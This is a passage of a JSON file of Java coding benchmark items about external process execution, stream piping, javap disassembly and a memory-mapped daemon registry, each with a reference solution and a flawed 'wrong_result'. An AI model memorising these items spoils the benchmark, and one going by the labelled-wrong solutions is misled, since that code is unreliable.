e.printStackTrace();\n            }\n        });\n\n        stdoutThread.start();\n        stderrThread.start();\n\n        stdoutThread.join();\n        stderrThread.join();\n\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new IOException(\"Diff process exited with code \" + exitCode);\n        }\n    }\n}"
  },
  {
    "Task_id": 297,
    "Instruction": "Task Description: Create a Java class that executes external processes, handles their output streams, and provides a way to interact with the process execution through callback methods.\n\nClass Description: The ProcessExecutor class is designed to manage external process execution in a cross-platform manner (handling Windows and Unix-like systems differently). It provides methods to start processes, redirect their output streams, and handle both standard output and error streams through a handler interface.\n\nAttributes:\n- process: Process - Represents the currently running external process\n- processBuilder: ProcessBuilder - Used to configure and start external processes\n\nMethods:\n- execRedirected: static Process(String[] command) throws IOException - Configures and starts an external process with error stream redirected to standard output. Handles Windows-specific command formatting.\n  - Input: String[] command - The command and arguments to execute\n  - Output: Process - The started process instance\n\n- listenOnProcess: int(String[] arguments, ProcessOutputHandler handler) - Executes a command and listens to its output streams, forwarding output lines and errors to the handler.\n  - Input: \n    - String[] arguments - The command and arguments to execute\n    - ProcessOutputHandler handler - Callback interface for handling output and errors\n  - Output: int - The exit value of the process (-1 if execution failed)\n\n- ProcessOutputHandler: interface - Callback interface for handling process output and errors\n  - Methods:\n    - handleOutputLine: void(String line) - Called for each line of output from the process\n    - handleError: void(String errorMessage) - Called when an error occurs during process execution",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.Map;\n\npublic class ProcessExecutor {\n\n    private Process process;\n    private ProcessBuilder processBuilder;\n\n    public static Process execRedirected(String[] command) throws IOException {\n        ProcessBuilder pb;\n\n        if (!OSUtils.isWindows()) {\n            pb = new ProcessBuilder(command);\n        } else {\n            String[] cmdLine = new String[command.length];\n            for (int i = 0; i < command.length; i++)\n                cmdLine[i] = command[i].replace(\"\\\"\", \"\\\\\\\"\");\n            pb = new ProcessBuilder(cmdLine);\n            Map<String, String> env = pb.environment();\n            env.put(\"CYGWIN\", \"nodosfilewarning\");\n        }\n        pb.redirectErrorStream(true);\n\n        return pb.start();\n    }\n\n    public int listenOnProcess(String[] arguments, ProcessOutputHandler handler) {\n        try {\n            final Process p = execRedirected(arguments);\n            Thread thread = new Thread() {\n                public void run() {\n                    try {\n                        InputStreamReader reader = new InputStreamReader(p.getInputStream());\n                        int c;\n                        String line = \"\";\n                        while ((c = reader.read()) != -1) {\n                            if ((char) c == '\\r')\n                                continue;\n                            if ((char) c == '\\n') {\n                                handler.handleOutputLine(line);\n                                line = \"\";\n                            } else {\n                                line += (char) c;\n                            }\n                        }\n                        handler.handleOutputLine(line);\n                        reader.close();\n\n                        reader = new InputStreamReader(p.getErrorStream());\n                        while ((c = reader.read()) != -1)\n                            System.err.print((char) c);\n                        reader.close();\n                    } catch (Exception e) {\n                        handler.handleError(\"Run Exception: \" + e.getMessage());\n                    }\n                }\n            };\n            thread.start();\n            int res = p.waitFor();\n            thread.join();\n            return res;\n        } catch (Exception e) {\n            handler.handleError(\"Process Exception: \" + e.getMessage());\n        }\n        return -1;\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutputLine(String line);\n        void handleError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessExecutor {\n    private Process process;\n    private ProcessBuilder processBuilder;\n\n    public static Process execRedirected(String[] command) throws IOException {\n        String os = System.getProperty(\"os.name\").toLowerCase();\n        String[] adjustedCommand;\n        if (os.contains(\"win\")) {\n            adjustedCommand = new String[command.length + 2];\n            adjustedCommand[0] = \"cmd.exe\";\n            adjustedCommand[1] = \"/c\";\n            System.arraycopy(command, 0, adjustedCommand, 2, command.length);\n        } else {\n            adjustedCommand = command;\n        }\n\n        ProcessBuilder pb = new ProcessBuilder(adjustedCommand);\n        pb.redirectErrorStream(true);\n        return pb.start();\n    }\n\n    public int listenOnProcess(String[] arguments, ProcessOutputHandler handler) {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(arguments);\n            pb.redirectErrorStream(false);\n            process = pb.start();\n\n            Thread stdoutThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        handler.handleOutputLine(line);\n                    }\n                } catch (IOException e) {\n                    handler.handleError(\"Error reading stdout: \" + e.getMessage());\n                }\n            });\n\n            Thread stderrThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        handler.handleError(line);\n                    }\n                } catch (IOException e) {\n                    handler.handleError(\"Error reading stderr: \" + e.getMessage());\n                }\n            });\n\n            stdoutThread.start();\n            stderrThread.start();\n\n            int exitCode = process.waitFor();\n\n            stdoutThread.join();\n            stderrThread.join();\n\n            return exitCode;\n        } catch (Exception e) {\n            handler.handleError(\"Process execution failed: \" + e.getMessage());\n            return -1;\n        }\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutputLine(String line);\n        void handleError(String errorMessage);\n    }\n}"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Create a Java function that disassembles a Java class file using the `javap` command-line tool and returns the disassembled output as a string.\n\nFunction Description: The function `disassembleClassFromJava` takes a Java class file as input, executes the `javap -c` command on it to disassemble the bytecode, and returns the disassembled output as a string. It handles the process execution, stream management, and error handling.\n\nInput: \n- `resourceFile` (String): The path or name of the Java class file to be disassembled.\n\nOutput: \n- (String): The disassembled bytecode output from the `javap` command. If an error occurs, returns an error message string.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.StringWriter;\nimport java.net.URL;\n\npublic String disassembleClassFromJava(String resourceFile) {\n    try {\n        ProcessBuilder pb = new ProcessBuilder(\"javap\", \"-c\", resourceFile)\n                .redirectErrorStream(true);\n\n        final Process process = pb.start();\n        final StringWriter writer = new StringWriter();\n        new Thread(() -> IOUtils.copyStreamNoException(process.getInputStream(), writer)).start();\n\n        final int ignored = process.waitFor();\n        final String processOutput = writer.toString();\n        return processOutput;\n    } catch (InterruptedException e) {\n        Thread.currentThread().interrupt();\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    } catch (IOException e) {\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public String disassembleClassFromJava(String resourceFile) {\n    try {\n        ProcessBuilder pb = new ProcessBuilder(\"javap\", \"-c\", \"\\\"\" + resourceFile + \"\\\"\");\n        Process process = pb.start();\n\n        StringBuilder output = new StringBuilder();\n        BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = outputReader.readLine()) != null) {\n            output.append(line).append(\"\\n\");\n        }\n\n        StringBuilder error = new StringBuilder();\n        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));\n        while ((line = errorReader.readLine()) != null) {\n            error.append(line).append(\"\\n\");\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            return error.toString();\n        } else {\n            return output.toString();\n        }\n    } catch (Exception e) {\n        return \"Error: \" + e.getMessage();\n    }\n}"
  },
  {
    "Task_id": 299,
    "Instruction": "Task Description: Create a Java class that facilitates the execution of external processes and manages their input/output streams, including support for piping data between multiple processes.\n\nClass Description: The ProcessRunner class provides functionality to execute external processes and handle their input/output streams efficiently. It supports both simple process execution and complex piping between multiple processes. The class uses ProcessBuilder for process creation and AsyncPipe threads for non-blocking stream handling.\n\nAttributes:\n- processRoot: File - The working directory for executed processes\n\nMethods:\n- execute(ProcessBuilder pb) -> void - Executes a single process with its output and error streams redirected to System.out and System.err respectively. Throws IOException and InterruptedException.\n- pipe(InputStream is, OutputStream os, ProcessBuilder... builders) -> void - Executes multiple processes in sequence, piping the output of one process to the input of the next. Uses temporary files for intermediate storage. Throws IOException and InterruptedException.\n- AsyncPipe(InputStream is, OutputStream os) - Constructor for AsyncPipe thread that handles stream copying and closes streams when done.\n- AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) - Constructor for AsyncPipe thread with option to control stream closing behavior.\n- run() -> void - (AsyncPipe method) The thread's main execution method that copies data between streams.",
    "Canonical_solution": "import com.google.common.base.Joiner;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class ProcessRunner {\n\n  File processRoot;\n\n  public ProcessRunner(File processRoot) {\n    this.processRoot = processRoot;\n  }\n\n  public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n    System.out.println(Joiner.on(\" \").join(pb.command()));\n    Process process = pb.redirectErrorStream(true).directory(processRoot).start();\n    new AsyncPipe(process.getErrorStream(), System.err).start();\n    new AsyncPipe(process.getInputStream(), System.out).start();\n    process.waitFor();\n  }\n\n  public void pipe(InputStream is, OutputStream os, ProcessBuilder... builders)\n      throws IOException, InterruptedException {\n    int i = 0;\n    File tempin;\n    File tempout = File.createTempFile(\"pipe\", \"txt\");\n    OutputStream tos;\n    for (ProcessBuilder builder : builders) {\n      if (i == 0) {\n      } else {\n        tempin = tempout;\n        is = new FileInputStream(tempin);\n      }\n      if (i == builders.length - 1) {\n        if (os == null) {\n          tos = System.out;\n        } else {\n          tos = os;\n        }\n      } else {\n        tempout = File.createTempFile(\"pipe\", \"txt\");\n        tos = new FileOutputStream(tempout);\n      }\n      Process process = builder.redirectErrorStream(true).directory(processRoot).start();\n      new AsyncPipe(process.getErrorStream(), System.err, false).start();\n      new AsyncPipe(process.getInputStream(), tos).start();\n      if (is != null) {\n        new AsyncPipe(is, process.getOutputStream()).start();\n      }\n      i++;\n      process.waitFor();\n    }\n  }\n\n  class AsyncPipe extends Thread {\n\n    InputStream is;\n    OutputStream os;\n    boolean closeStreams;\n\n    AsyncPipe(InputStream is, OutputStream os) {\n      this.is = is;\n      this.os = os;\n      closeStreams = true;\n    }\n\n    AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n      this.is = is;\n      this.os = os;\n      this.closeStreams = closeStreams;\n    }\n\n    @Override\n    public void run() {\n      try {\n        synchronized (this) {\n          byte[] buf = new byte[4096];\n          int i;\n          while ((i = is.read(buf)) != -1) {\n            os.write(buf, 0, i);\n          }\n          if (closeStreams) {\n            os.close();\n            is.close();\n          }\n        }\n      } catch (IOException e) {\n        e.printStackTrace();\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ProcessRunner {\n    private File processRoot;\n\n    public ProcessRunner(File processRoot) {\n        this.processRoot = processRoot;\n    }\n\n    public void execute(ProcessBuilder pb) throws IOException, InterruptedException {\n        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);\n        pb.redirectError(ProcessBuilder.Redirect.INHERIT);\n        Process process = pb.start();\n        process.waitFor();\n    }\n\n    public void pipe(InputStream is, OutputStream os, ProcessBuilder... builders) throws IOException, InterruptedException {\n        if (builders.length == 0) {\n            copyStream(is, os);\n            return;\n        }\n\n        List<File> tempFiles = new ArrayList<>();\n        for (int i = 0; i < builders.length - 1; i++) {\n            tempFiles.add(File.createTempFile(\"pipe\", \".tmp\"));\n        }\n\n        File lastTempFile = File.createTempFile(\"pipe\", \".tmp\");\n        tempFiles.add(lastTempFile);\n\n        for (int i = 0; i < builders.length; i++) {\n            ProcessBuilder pb = builders[i];\n            if (i == 0) {\n                pb.redirectInput(is);\n            } else {\n                pb.redirectInput(tempFiles.get(i - 1));\n            }\n            if (i == builders.length - 1) {\n                pb.redirectOutput(lastTempFile);\n            } else {\n                pb.redirectOutput(tempFiles.get(i));\n            }\n            pb.directory(processRoot);\n            Process process = pb.start();\n            process.waitFor();\n        }\n\n        try (FileInputStream fis = new FileInputStream(lastTempFile)) {\n            copyStream(fis, os);\n        }\n\n        for (File file : tempFiles) {\n            file.delete();\n        }\n    }\n\n    private void copyStream(InputStream in, OutputStream out) throws IOException {\n        byte[] buffer = new byte[8192];\n        int bytesRead;\n        while ((bytesRead = in.read(buffer)) != -1) {\n            out.write(buffer, 0, bytesRead);\n        }\n    }\n\n    class AsyncPipe extends Thread {\n        private final InputStream is;\n        private final OutputStream os;\n        private final boolean closeStreams;\n\n        public AsyncPipe(InputStream is, OutputStream os) {\n            this(is, os, true);\n        }\n\n        public AsyncPipe(InputStream is, OutputStream os, boolean closeStreams) {\n            this.is = is;\n            this.os = os;\n            this.closeStreams = closeStreams;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[8192];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    os.write(buffer, 0, bytesRead);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                if (closeStreams) {\n                    try {\n                        is.close();\n                        os.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a thread-safe registry class for managing daemon processes using memory-mapped files for persistent storage. The class should handle concurrent access, automatic file resizing, and data recovery from corrupted states.\n\nClass Description: DaemonRegistry is a thread-safe class that maintains a registry of daemon processes in a memory-mapped file. It provides methods to read, update, and manage daemon information with proper file locking and automatic buffer resizing when needed. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging operations\n- MAX_LENGTH: int - Maximum initial size for the memory-mapped buffer (32KB)\n- LOCK_TIMEOUT_MS: long - Timeout duration for acquiring file locks (20 seconds)\n- locks: Map<Path, Object> - Static concurrent map for maintaining file-level locks\n- registryFile: Path - Path to the registry file\n- lck: Object - Instance-specific lock object\n- channel: FileChannel - File channel for the registry file\n- buffer: MappedByteBuffer - Memory-mapped byte buffer for the file\n- size: long - Current size of the memory-mapped buffer\n- infosMap: Map<String, DaemonInfo> - Map storing daemon information\n\nMethods:\n- DaemonRegistry(Path registryFile) -> void - Constructor that initializes the registry by creating or opening the specified file and setting up the memory-mapped buffer\n- close() -> void - Closes the file channel and releases system resources\n- getAll() -> List<DaemonInfo> - Returns a list of all registered daemon information\n- read() -> void - Reads all daemon information from the memory-mapped file into the internal map\n- doUpdate(Runnable updater) -> void - Performs a read or update operation with file locking, handles buffer resizing and data recovery\n- tryLock() -> FileLock - Attempts to acquire an exclusive lock on the file\n- reset() -> void - Clears the internal map and resets the buffer\n- readString() -> String - Reads a UTF-8 encoded string from the buffer\n- writeString(String str) -> void - Writes a UTF-8 encoded string to the buffer\n- nextPowerOf2(long a, long min) -> long - Helper method to calculate the next power of 2 greater than or equal to input values",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.BufferOverflowException;\nimport java.nio.BufferUnderflowException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DaemonRegistry implements AutoCloseable {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(DaemonRegistry.class);\n    private static final int MAX_LENGTH = 32768;\n    private static final long LOCK_TIMEOUT_MS = 1000 * 20;\n    private static final Map<Path, Object> locks = new ConcurrentHashMap<>();\n\n    private final Path registryFile;\n    private final Object lck;\n    private final FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new HashMap<>();\n\n    public DaemonRegistry(Path registryFile) {\n        final Path absPath = registryFile.toAbsolutePath().normalize();\n        this.lck = locks.computeIfAbsent(absPath, p -> new Object());\n        this.registryFile = absPath;\n        try {\n            if (!Files.isRegularFile(absPath)) {\n                if (!Files.isDirectory(absPath.getParent())) {\n                    Files.createDirectories(absPath.getParent());\n                }\n            }\n            channel = FileChannel.open(\n                    absPath, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            size = nextPowerOf2(channel.size(), MAX_LENGTH);\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n        } catch (IOException e) {\n            throw new DaemonException(e);\n        }\n    }\n\n    public void close() {\n        try {\n            channel.close();\n        } catch (IOException e) {\n            throw new DaemonException(\"Error closing registry\", e);\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        read();\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        doUpdate(null);\n    }\n\n    private void doUpdate(Runnable updater) {\n        if (!Files.isReadable(registryFile)) {\n            throw new DaemonException(\"Registry became unaccessible\");\n        }\n\n        synchronized (lck) {\n            final long deadline = System.currentTimeMillis() + LOCK_TIMEOUT_MS;\n            while (System.currentTimeMillis() < deadline) {\n                try (FileLock l = tryLock()) {\n                    BufferCaster.cast(buffer).position(0);\n                    infosMap.clear();\n                    int nb = buffer.getInt();\n                    for (int i = 0; i < nb; i++) {\n                        String daemonId = readString();\n                        String javaHome = readString();\n                        String mavenHome = readString();\n                        int pid = buffer.getInt();\n                        String address = readString();\n\n                        byte[] token = new byte[DaemonInfo.TOKEN_SIZE];\n                        buffer.get(token);\n\n                        String locale = readString();\n                        List<String> opts = new ArrayList<>();\n                        int nbOpts = buffer.getInt();\n                        for (int j = 0; j < nbOpts; j++) {\n                            opts.add(readString());\n                        }\n                        DaemonState state = DaemonState.values()[buffer.get()];\n                        long lastIdle = buffer.getLong();\n                        long lastBusy = buffer.getLong();\n                        DaemonInfo di = new DaemonInfo(\n                                daemonId, javaHome, mavenHome, pid, address, token, locale, opts, state, lastIdle,\n                                lastBusy);\n                        infosMap.putIfAbsent(di.getId(), di);\n                    }\n\n                    if (updater != null) {\n                        updater.run();\n                        BufferCaster.cast(buffer).position((int) 0);\n                        buffer.putInt(infosMap.size());\n                        for (DaemonInfo di : infosMap.values()) {\n                            writeString(di.getId());\n                            writeString(di.getJavaHome());\n                            writeString(di.getMvndHome());\n                            buffer.putInt(di.getPid());\n                            writeString(di.getAddress());\n                            buffer.put(di.getToken());\n                            writeString(di.getLocale());\n                            buffer.putInt(di.getOptions().size());\n                            for (String opt : di.getOptions()) {\n                                writeString(opt);\n                            }\n                            buffer.put((byte) di.getState().ordinal());\n                            buffer.putLong(di.getLastIdle());\n                            buffer.putLong(di.getLastBusy());\n                        }\n                    }\n                    return;\n                } catch (BufferOverflowException e) {\n                    size <<= 1;\n                    LOGGER.info(\"Resizing registry to {} kb due to buffer overflow\", (size / 1024));\n                    try {\n                        buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n                    } catch (IOException ex) {\n                        ex.addSuppressed(e);\n                        throw new DaemonException(\"Could not resize registry \" + registryFile, ex);\n                    }\n                } catch (IOException e) {\n                    throw new DaemonException(\n                            \"Exception while \" + (updater != null ? \"updating \" : \"reading \") + registryFile, e);\n                } catch (IllegalStateException | ArrayIndexOutOfBoundsException | BufferUnderflowException e) {\n                    String absPath = registryFile.toAbsolutePath().normalize().toString();\n                    LOGGER.warn(\n                            \"Invalid daemon registry info, trying to recover from this issue. \"\n                                    + \"If you keep getting this warning, try deleting the `registry.bin` file at [{}]\",\n                            absPath,\n                            e);\n                    this.reset();\n                    return;\n                }\n            }\n            throw new RuntimeException(\"Could not lock \" + registryFile + \" within \" + LOCK_TIMEOUT_MS + \" ms\");\n        }\n    }\n\n    private FileLock tryLock() {\n        try {\n            return channel.tryLock(0, size, false);\n        } catch (IOException e) {\n            throw new DaemonException(\"Could not lock \" + registryFile, e);\n        }\n    }\n\n    private void reset() {\n        infosMap.clear();\n        BufferCaster.cast(buffer).clear();\n        buffer.putInt(0);\n    }\n\n    protected String readString() {\n        int sz = buffer.getShort();\n        if (sz == -1) {\n            return null;\n        }\n        if (sz < -1 || sz > 1024) {\n            throw new IllegalStateException(\"Bad string size: \" + sz);\n        }\n        byte[] buf = new byte[sz];\n        buffer.get(buf);\n        return new String(buf, StandardCharsets.UTF_8);\n    }\n\n    protected void writeString(String str) {\n        if (str == null) {\n            buffer.putShort((short) -1);\n            return;\n        }\n        byte[] buf = str.getBytes(StandardCharsets.UTF_8);\n        if (buf.length > 1024) {\n            LOGGER.warn(\"Attempting to write string longer than 1024 bytes: '{}'. Please raise an issue.\", str);\n            str = str.substring(0, 1033);\n            while (buf.length > 1024) {\n                str = str.substring(0, str.length() - 12) + \"\u2026\";\n                buf = str.getBytes(StandardCharsets.UTF_8);\n            }\n        }\n        buffer.putShort((short) buf.length);\n        buffer.put(buf);\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        long b = min;\n        while (b < a) {\n            b = b << 1;\n        }\n        return b;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.*;\nimport java.util.*;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class DaemonRegistry implements AutoCloseable {\n    private static final int MAX_LENGTH = 32 * 1024;\n    private static final long LOCK_TIMEOUT_MS = 20000;\n    private static final ConcurrentHashMap<Path, Object> locks = new ConcurrentHashMap<>();\n    private final Logger LOGGER;\n    private final Path registryFile;\n    private final Object lck = new Object();\n    private FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new ConcurrentHashMap<>();\n\n    public DaemonRegistry(Path registryFile) throws IOException {\n        this.registryFile = registryFile;\n        Files.createDirectories(registryFile.getParent());\n        if (!Files.exists(registryFile)) {\n            Files.createFile(registryFile);\n            Files.write(registryFile, new byte[0], StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);\n        }\n        channel = FileChannel.open(registryFile, StandardOpenOption.READ, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n        if (channel.size() < MAX_LENGTH) {\n            channel.truncate(MAX_LENGTH);\n        }\n        buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, channel.size());\n        size = channel.size();\n        read();\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        int pos = 0;\n        while (pos < buffer.remaining()) {\n            int keyLen = buffer.getInt(pos);\n            pos += 4;\n            String key = readString(pos, keyLen);\n            pos += keyLen;\n            int valueLen = buffer.getInt(pos);\n            pos += 4;\n            byte[] valueBytes = new byte[valueLen];\n            buffer.get(valueBytes, pos, valueLen);\n            pos += valueLen;\n            DaemonInfo info = parseValue(valueBytes);\n            infosMap.put(key, info);\n        }\n    }\n\n    private String readString(int pos, int len) {\n        byte[] bytes = new byte[len];\n        buffer.get(bytes, pos, len);\n        return new String(bytes, StandardCharsets.UTF_8);\n    }\n\n    private void writeString(String str) {\n        int len = str.length();\n        buffer.putInt(len);\n        buffer.put(str.getBytes(StandardCharsets.UTF_8));\n    }\n\n    private void doUpdate(Runnable updater) {\n        synchronized (lck) {\n            FileLock lock = tryLock();\n            if (lock == null) {\n                return;\n            }\n            try {\n                updater.run();\n            } finally {\n                lock.release();\n            }\n        }\n    }\n\n    private FileLock tryLock() {\n        FileLock lock = null;\n        try {\n            lock = channel.tryLock(0, Long.MAX_VALUE, true);\n            if (lock != null) {\n                locks.put(registryFile, new Object());\n            }\n        } catch (IOException e) {\n            LOGGER.error(\"Failed to acquire lock\", e);\n        }\n        return lock;\n    }\n\n    private void reset() {\n        synchronized (lck) {\n            if (channel != null) {\n                try {\n                    channel.truncate(0);\n                    buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, MAX_LENGTH);\n                    size = MAX_LENGTH;\n                    infosMap.clear();\n                } catch (IOException e) {\n                    LOGGER.error(\"Failed to reset registry\", e);\n                }\n            }\n        }\n    }\n\n    private DaemonInfo parseValue(byte[] bytes) {\n        // Placeholder for actual parsing logic\n        return new DaemonInfo();\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        a--;\n        a |= a >>> 1;\n        a |= a >>> 2;\n        a |= a >>> 4;\n        a |= a >>> 8;\n        a |= a >>> 16;\n        a++;\n        return Math.max(a, min);\n    }\n}"
  },
  {
    "Task_id": 300,
    "Instruction": "Task Description: Implement a function that executes an external process, captures its output and error streams, and handles the results appropriately, including error cases and output printing.\n\nFunction Description: The function `doFork` executes an external process specified by a command string, redirects its standard output and error streams to files, and optionally prints them. It waits for the process to complete, checks the exit code, and handles any exceptions or errors that occur during execution. The function also interacts with a `BinaryLinkServer` to retrieve results or exceptions from the forked process.\n\nInput:\n- `reader`: BinaryLinkServer - An object that reads results from the forked process and may contain exceptions.\n- `commandString`: List<String> - The command and arguments to execute the external process.\n- `stdOut`: File - The file to which the standard output of the process will be redirected.\n- `stdErr`: File - The file to which the standard error of the process will be redirected.\n- `printOut`: boolean - If true, the standard output will be printed to the console.\n- `printErr`: boolean - If true, the standard error will be printed to the console.\n\nOutput:\n- Returns `List<IterationResult>` - A list of results from the forked process if execution is successful.\n- Throws `BenchmarkException` - If the process fails (non-zero exit code), an IOException occurs, or the thread is interrupted.",
    "Canonical_solution": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\n\nprivate List<IterationResult> doFork(BinaryLinkServer reader, List<String> commandString,\n                                    File stdOut, File stdErr, boolean printOut, boolean printErr) {\n    try (FileOutputStream fosErr = new FileOutputStream(stdErr);\n         FileOutputStream fosOut = new FileOutputStream(stdOut)) {\n        ProcessBuilder pb = new ProcessBuilder(commandString);\n        Process p = pb.start();\n\n        InputStreamDrainer errDrainer = new InputStreamDrainer(p.getErrorStream(), fosErr);\n        InputStreamDrainer outDrainer = new InputStreamDrainer(p.getInputStream(), fosOut);\n\n        if (printErr) {\n            errDrainer.addOutputStream(new OutputFormatAdapter(out));\n        }\n\n        if (printOut) {\n            outDrainer.addOutputStream(new OutputFormatAdapter(out));\n        }\n\n        errDrainer.start();\n        outDrainer.start();\n\n        int ecode = p.waitFor();\n\n        errDrainer.join();\n        outDrainer.join();\n\n        reader.waitFinish();\n\n        if (ecode != 0) {\n            out.println(\"<forked VM failed with exit code \" + ecode + \">\");\n            out.println(\"<stdout last='\" + TAIL_LINES_ON_ERROR + \" lines'>\");\n            for (String l : FileUtils.tail(stdOut, TAIL_LINES_ON_ERROR)) {\n                out.println(l);\n            }\n            out.println(\"</stdout>\");\n            out.println(\"<stderr last='\" + TAIL_LINES_ON_ERROR + \" lines'>\");\n            for (String l : FileUtils.tail(stdErr, TAIL_LINES_ON_ERROR)) {\n                out.println(l);\n            }\n            out.println(\"</stderr>\");\n\n            out.println(\"\");\n        }\n\n        BenchmarkException exception = reader.getException();\n        if (exception == null) {\n            if (ecode == 0) {\n                return reader.getResults();\n            } else {\n                throw new BenchmarkException(new IllegalStateException(\"Forked VM failed with exit code \" + ecode));\n            }\n        } else {\n            throw exception;\n        }\n\n    } catch (IOException ex) {\n        out.println(\"<failed to invoke the VM, caught IOException: \" + ex.getMessage() + \">\");\n        out.println(\"\");\n        throw new BenchmarkException(ex);\n    } catch (InterruptedException ex) {\n        out.println(\"<host VM has been interrupted waiting for forked VM: \" + ex.getMessage() + \">\");\n        out.println(\"\");\n        throw new BenchmarkException(ex);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "wrong_result": "public List<IterationResult> doFork(BinaryLinkServer reader, List<String> commandString, File stdOut, File stdErr, boolean printOut, boolean printErr) throws BenchmarkException {\n    try {\n        ProcessBuilder pb = new ProcessBuilder(commandString);\n        pb.redirectOutput(stdOut);\n        pb.redirectError(stdErr);\n        Process process = pb.start();\n        \n        int exitCode = process.waitFor();\n        \n        if (exitCode != 0) {\n            throw new BenchmarkException(\"Process exited with code \" + exitCode);\n        }\n        \n        if (printOut) {\n            try (BufferedReader readerOut = new BufferedReader(new FileReader(stdOut))) {\n                String line;\n                while ((line = readerOut.readLine()) != null) {\n                    System.out.println(line);\n                }\n            } catch (IOException e) {\n                throw new BenchmarkException(\"Failed to read output file: \" + stdOut.getAbsolutePath(), e);\n            }\n        }\n        \n        if (printErr) {\n            try (BufferedReader readerErr = new BufferedReader(new FileReader(stdErr))) {\n                String line;\n                while ((line = readerErr.readLine()) != null) {\n                    System.err.println(line);\n                }\n            } catch (IOException e) {\n                throw new BenchmarkException(\"Failed to read error file: \" + stdErr.getAbsolutePath(), e);\n            }\n        }\n        \n        if (reader.getException() != null) {\n            throw new BenchmarkException(\"Exception from BinaryLinkServer: \" + reader.getException().getMessage(), reader.getException());\n        }\n        \n        List<IterationResult> results = reader.readResults();\n        return results;\n        \n    } catch (IOException | InterruptedException e) {\n        throw new BenchmarkException(\"Error executing process\", e);\n    }\n}"
  },
  {
    "Task_id": 301,
